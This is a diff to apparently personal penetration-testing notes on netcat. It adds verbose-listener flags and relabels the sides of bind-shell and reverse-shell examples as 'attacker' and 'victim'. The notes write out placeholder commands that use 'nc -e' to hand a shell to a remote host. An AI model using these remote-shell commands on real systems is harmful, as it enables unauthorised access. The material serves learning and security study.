@@ -386,16 +386,17 @@ here you will provide the remote server IP address, username, and password in th
 
 ## NetCat
 
-on server side:
+on Listner/ receiver side:
 
 ```
-$nc -nlp [port]
+$nc -nlvp [port]
 ```
 n stands for numerical host ( no DNS)
 l stands for listen
+v stands for verbose
 p stands for port
 
-on clinet side:
+on clinet / the one who is connection to the server side:
 
 ```
 $nc -n [netcat Server machine IP address] [port]
@@ -422,13 +423,15 @@ $nc -n [serverIP] [server port] < [path of the file to be send]
 
 **forword command execution(Bind Shell)**
 
-server side:
+server (victim) side:
 
 ```
 $nc -lp [port] -e [full path of command to be executed]
 ```
 
-clinet side:
+here the victim is forwording his shell (/bin/bash) to the attacker to execute commands throught it
+
+clinet (attacker) side:
 
 ```
 $nc -n [serverIP] [serve rport]
@@ -436,16 +439,18 @@ $nc -n [serverIP] [serve rport]
 
 **reverse shell**
 
-server side:
+reciver (Attacker) side:
 
 ```
 nc -lp [port]
 ```
-clinet side:
+clinet (victim) side:
 
 ```
 nc -n *serverIP* *serverPort* -e *full path of command to be executed*
 ```
+here the attacker is gaining access the the client / victim shell to use it
+
 ## socat
 
 socat can be used for bidirectnal communication between sender and reciver
